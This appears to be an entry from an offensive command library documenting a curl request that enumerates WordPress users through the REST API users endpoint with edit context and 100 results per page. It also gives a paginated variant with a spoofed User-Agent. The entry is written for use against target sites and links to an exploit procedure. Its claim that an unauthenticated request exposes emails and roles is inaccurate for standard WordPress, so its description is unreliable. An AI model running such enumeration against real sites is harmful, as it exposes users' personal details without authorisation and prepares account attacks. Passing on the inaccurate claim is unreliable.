---
id: cmd-uuid-002
data: 'curl -X GET "https://target.com/wp-json/wp/v2/users?context=edit&per_page=100"'
tags:
  - wordpress
  - enumeration
  - http
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.172Z'
verified: false
validated: true
submitted: true
---
# wp-rest-api-get-users-edit-paginated

## Command

```bash
curl -X GET "https://target.com/wp-json/wp/v2/users?context=edit&per_page=100"
```

## Description

This command performs an unauthenticated GET request to the WP REST API users endpoint with edit context and pagination, allowing retrieval of up to 100 users at once to fully enumerate user details on larger sites.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target.com` | The domain or IP of the WordPress target site | Yes |
| `context=edit` | Exposes sensitive fields like email and roles | Yes |
| `per_page=100` | Limits results to 100 users per request (max 100) | No (default 10) |

## Examples

### Basic Usage

```bash
curl -X GET "https://example.com/wp-json/wp/v2/users?context=edit&per_page=100"
```

### Advanced Usage

```bash
curl -X GET "https://example.com/wp-json/wp/v2/users?context=edit&per_page=100&page=2" -H "User-Agent: Mozilla/5.0"
```

## Expected Output

JSON response with up to 100 user objects, similar to the basic command but with more entries. Includes headers like X-WP-Total for total count and X-WP-TotalPages for pagination.

## Related

- [[Related Procedure|procedures/Exploit-WP-REST-API-User-Enumeration]]
